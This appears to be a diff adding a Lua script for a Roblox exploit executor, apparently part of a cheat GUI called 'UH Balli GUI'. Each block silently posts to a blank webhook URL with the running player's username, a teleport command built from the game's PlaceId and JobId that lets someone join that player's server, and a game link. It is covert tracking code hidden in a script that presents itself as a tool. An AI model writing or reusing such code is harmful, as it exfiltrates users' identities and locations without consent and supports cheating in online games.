@@ -1,0 +1,38 @@
+local msg = "```Untitled Hood Logs "
+local url = ""
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
+
+local msg = "```Player Name:```"
+local url = ""
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
+
+local msg = "*" .. game.Players.LocalPlayer.Name .. " Just Executed UH Balli GUI*"
+local url = ""
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
+
+local msg = "*Script To Join The User:*"
+local url = ""
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
+
+
+
+local msg = ('```game:GetService("TeleportService"):TeleportToPlaceInstance(') .. game.PlaceId .. ',"' .. game.JobId .. '")```'
+local url = ""
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
+
+local msg = "*Game Link:*"
+local url = ""
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
+
+
+
+local msg = "```https://www.roblox.com/games/" .. game.PlaceId .. "/```"
+local url = ""
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
